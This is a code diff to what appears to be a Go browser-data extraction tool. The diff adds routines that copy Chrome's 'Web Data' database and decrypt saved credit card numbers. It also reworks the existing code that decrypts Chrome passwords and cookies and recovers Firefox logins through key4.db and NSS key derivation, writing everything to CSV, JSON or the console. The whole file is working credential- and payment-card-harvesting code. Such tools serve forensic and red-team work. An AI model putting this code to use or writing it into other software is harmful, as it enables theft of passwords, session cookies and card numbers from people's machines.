@@ -1,4 +1,4 @@
-package common
+package data
 
 import (
 	"bytes"
@@ -25,17 +25,30 @@ type Item interface {
 	// FirefoxParse parse firefox items
 	FirefoxParse() error
 
-	// OutPut with json or csv
+	// OutPut file name and format type
 	OutPut(format, browser, dir string) error
 
-	// Copy item file to local path
-	CopyItem() error
+	// CopyDB is copy item db file to current dir
+	CopyDB() error
 
-	// Release item file
+	// Release is delete item db file
 	Release() error
 }
 
+const (
+	ChromeCreditFile   = "Web Data"
+	ChromePasswordFile = "Login Data"
+	ChromeHistoryFile  = "History"
+	ChromeCookieFile   = "Cookies"
+	ChromeBookmarkFile = "Bookmarks"
+	FirefoxCookieFile  = "cookies.sqlite"
+	FirefoxKey4File    = "key4.db"
+	FirefoxLoginFile   = "logins.json"
+	FirefoxDataFile    = "places.sqlite"
+)
+
 var (
+	queryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
 	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
 	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
 	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
@@ -45,6 +58,15 @@ var (
 	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
 	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
 	closeJournalMode      = `PRAGMA journal_mode=off`
+)
+
+const (
+	bookmarkID       = "id"
+	bookmarkAdded    = "date_added"
+	bookmarkUrl      = "url"
+	bookmarkName     = "name"
+	bookmarkType     = "type"
+	bookmarkChildren = "children"
 )
 
 type bookmarks struct {
@@ -124,6 +146,9 @@ func (b *bookmarks) FirefoxParse() error {
 			title                    string
 		)
 		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
+		if err != nil {
+			log.Warn(err)
+		}
 		if url, ok := tempMap[id]; ok {
 			bookmarkUrl = url
 		}
@@ -138,8 +163,8 @@ func (b *bookmarks) FirefoxParse() error {
 	return nil
 }
 
-func (b *bookmarks) CopyItem() error {
-	return utils.CopyDB(b.mainPath, filepath.Base(b.mainPath))
+func (b *bookmarks) CopyDB() error {
+	return copyToLocalPath(b.mainPath, filepath.Base(b.mainPath))
 }
 
 func (b *bookmarks) Release() error {
@@ -184,6 +209,9 @@ func (c *cookies) ChromeParse(secretKey []byte) error {
 		}
 	}()
 	rows, err := cookieDB.Query(queryChromiumCookie)
+	if err != nil {
+		return err
+	}
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -197,6 +225,9 @@ func (c *cookies) ChromeParse(secretKey []byte) error {
 			value, encryptValue                           []byte
 		)
 		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
+		if err != nil {
+			log.Error(err)
+		}
 		cookie := cookie{
 			KeyName:      key,
 			Host:         host,
@@ -209,13 +240,15 @@ func (c *cookies) ChromeParse(secretKey []byte) error {
 			CreateDate:   utils.TimeEpochFormat(createDate),
 			ExpireDate:   utils.TimeEpochFormat(expireDate),
 		}
-		// remove utils.Prefix 'v10'
+		// remove 'v10'
 		if secretKey == nil {
 			value, err = decrypt.DPApi(encryptValue)
 		} else {
 			value, err = decrypt.ChromePass(secretKey, encryptValue)
 		}
-
+		if err != nil {
+			log.Debug(err)
+		}
 		cookie.Value = string(value)
 		c.cookies[host] = append(c.cookies[host], cookie)
 	}
@@ -266,8 +299,8 @@ func (c *cookies) FirefoxParse() error {
 	return nil
 }
 
-func (c *cookies) CopyItem() error {
-	return utils.CopyDB(c.mainPath, filepath.Base(c.mainPath))
+func (c *cookies) CopyDB() error {
+	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
 }
 
 func (c *cookies) Release() error {
@@ -308,6 +341,9 @@ func (h *historyData) ChromeParse(key []byte) error {
 		}
 	}()
 	rows, err := historyDB.Query(queryChromiumHistory)
+	if err != nil {
+		return err
+	}
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -372,6 +408,9 @@ func (h *historyData) FirefoxParse() error {
 			visitCount    int
 		)
 		err = historyRows.Scan(&id, &url, &visitDate, &title, &visitCount)
+		if err != nil {
+			log.Warn(err)
+		}
 		h.history = append(h.history, history{
 			Title:         title,
 			Url:           url,
@@ -383,8 +422,8 @@ func (h *historyData) FirefoxParse() error {
 	return nil
 }
 
-func (h *historyData) CopyItem() error {
-	return utils.CopyDB(h.mainPath, filepath.Base(h.mainPath))
+func (h *historyData) CopyDB() error {
+	return copyToLocalPath(h.mainPath, filepath.Base(h.mainPath))
 }
 
 func (h *historyData) Release() error {
@@ -433,6 +472,9 @@ func (p *passwords) ChromeParse(key []byte) error {
 		}
 	}()
 	rows, err := loginDB.Query(queryChromiumLogin)
+	if err != nil {
+		return err
+	}
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Debug(err)
@@ -473,7 +515,7 @@ func (p *passwords) ChromeParse(key []byte) error {
 }
 
 func (p *passwords) FirefoxParse() error {
-	globalSalt, metaBytes, nssA11, nssA102, err := getDecryptKey()
+	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey()
 	if err != nil {
 		return err
 	}
@@ -486,7 +528,7 @@ func (p *passwords) FirefoxParse() error {
 	var masterPwd []byte
 	m, err := decrypt.Meta(globalSalt, masterPwd, meta)
 	if err != nil {
-		log.Error("decrypt firefox failed", err)
+		log.Error("decrypt firefox meta failed", err)
 		return err
 	}
 	if bytes.Contains(m, []byte("password-check")) {
@@ -495,16 +537,16 @@ func (p *passwords) FirefoxParse() error {
 		if m == 0 {
 			nss, err := decrypt.DecodeNss(nssA11)
 			if err != nil {
+				log.Error("decode firefox nssA11 bytes failed", err)
 				return err
 			}
-			log.Debug("decrypt asn1 pbe success")
 			finallyKey, err := decrypt.Nss(globalSalt, masterPwd, nss)
 			finallyKey = finallyKey[:24]
 			if err != nil {
+				log.Error("get firefox finally key failed")
 				return err
 			}
-			log.Debug("get firefox finally key success")
-			allLogins, err := getLoginData()
+			allLogins, err := getFirefoxLoginData()
 			if err != nil {
 				return err
 			}
@@ -526,20 +568,19 @@ func (p *passwords) FirefoxParse() error {
 					Password:   string(decrypt.PKCS5UnPadding(pwd)),
 					CreateDate: v.CreateDate,
 				})
-
 			}
 		}
 	}
 	return nil
 }
 
-func (p *passwords) CopyItem() error {
-	err := utils.CopyDB(p.mainPath, filepath.Base(p.mainPath))
+func (p *passwords) CopyDB() error {
+	err := copyToLocalPath(p.mainPath, filepath.Base(p.mainPath))
 	if err != nil {
 		log.Error(err)
 	}
 	if p.subPath != "" {
-		err = utils.CopyDB(p.subPath, filepath.Base(p.subPath))
+		err = copyToLocalPath(p.subPath, filepath.Base(p.subPath))
 	}
 	return err
 }
@@ -570,7 +611,92 @@ func (p *passwords) OutPut(format, browser, dir string) error {
 	}
 }
 
-func getDecryptKey() (item1, item2, a11, a102 []byte, err error) {
+type creditCards struct {
+	mainPath string
+	cards    map[string][]card
+}
+
+func NewCCards(main string, sub string) Item {
+	return &creditCards{mainPath: main}
+}
+
+func (c *creditCards) FirefoxParse() error {
+	return nil // FireFox does not have a credit card saving feature
+}
+
+func (c *creditCards) ChromeParse(secretKey []byte) error {
+	c.cards = make(map[string][]card)
+	creditDB, err := sql.Open("sqlite3", ChromeCreditFile)
+	if err != nil {
+		return err
+	}
+	defer func() {
+		if err := creditDB.Close(); err != nil {
+			log.Debug(err)
+		}
+	}()
+	rows, err := creditDB.Query(queryChromiumCredit)
+	if err != nil {
+		return err
+	}
+	defer func() {
+		if err := rows.Close(); err != nil {
+			log.Debug(err)
+		}
+	}()
+	for rows.Next() {
+		var (
+			name, month, year, guid string
+			value, encryptValue     []byte
+		)
+		err := rows.Scan(&guid, &name, &month, &year, &encryptValue)
+		if err != nil {
+			log.Error(err)
+		}
+		creditCardInfo := card{
+			GUID:            guid,
+			Name:            name,
+			ExpirationMonth: month,
+			ExpirationYear:  year,
+		}
+		if secretKey == nil {
+			value, err = decrypt.DPApi(encryptValue)
+		} else {
+			value, err = decrypt.ChromePass(secretKey, encryptValue)
+		}
+		if err != nil {
+			log.Debug(err)
+		}
+		creditCardInfo.CardNumber = string(value)
+		c.cards[guid] = append(c.cards[guid], creditCardInfo)
+	}
+	return nil
+}
+
+func (c *creditCards) CopyDB() error {
+	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
+}
+
+func (c *creditCards) Release() error {
+	return os.Remove(filepath.Base(c.mainPath))
+}
+
+func (c *creditCards) OutPut(format, browser, dir string) error {
+	switch format {
+	case "csv":
+		err := c.outPutCsv(browser, dir)
+		return err
+	case "console":
+		c.outPutConsole()
+		return nil
+	default:
+		err := c.outPutJson(browser, dir)
+		return err
+	}
+}
+
+// getFirefoxDecryptKey get value from key4.db
+func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
 	var (
 		keyDB   *sql.DB
 		pwdRows *sql.Rows
@@ -616,7 +742,8 @@ func getDecryptKey() (item1, item2, a11, a102 []byte, err error) {
 	return item1, item2, a11, a102, nil
 }
 
-func getLoginData() (l []loginData, err error) {
+// getFirefoxLoginData use to get firefox
+func getFirefoxLoginData() (l []loginData, err error) {
 	s, err := ioutil.ReadFile(FirefoxLoginFile)
 	if err != nil {
 		return nil, err
@@ -679,27 +806,13 @@ type (
 		VisitCount    int
 		LastVisitTime time.Time
 	}
-)
-
-const (
-	bookmarkID       = "id"
-	bookmarkAdded    = "date_added"
-	bookmarkUrl      = "url"
-	bookmarkName     = "name"
-	bookmarkType     = "type"
-	bookmarkChildren = "children"
-)
-
-const (
-	ChromePasswordFile = "Login Data"
-	ChromeHistoryFile  = "History"
-	ChromeCookieFile   = "Cookies"
-	ChromeBookmarkFile = "Bookmarks"
-	FirefoxCookieFile  = "cookies.sqlite"
-	FirefoxKey4File    = "key4.db"
-	FirefoxLoginFile   = "logins.json"
-	FirefoxDataFile    = "places.sqlite"
-	FirefoxKey3DB      = "key3.db"
+	card struct {
+		GUID            string
+		Name            string
+		ExpirationYear  string
+		ExpirationMonth string
+		CardNumber      string
+	}
 )
 
 func (p passwords) Len() int {
@@ -712,4 +825,25 @@ func (p passwords) Less(i, j int) bool {
 
 func (p passwords) Swap(i, j int) {
 	p.logins[i], p.logins[j] = p.logins[j], p.logins[i]
+}
+
+func copyToLocalPath(src, dst string) error {
+	locals, _ := filepath.Glob("*")
+	for _, v := range locals {
+		if v == dst {
+			err := os.Remove(dst)
+			if err != nil {
+				return err
+			}
+		}
+	}
+	sourceFile, err := ioutil.ReadFile(src)
+	if err != nil {
+		log.Debug(err.Error())
+	}
+	err = ioutil.WriteFile(dst, sourceFile, 0777)
+	if err != nil {
+		log.Debug(err.Error())
+	}
+	return err
 }
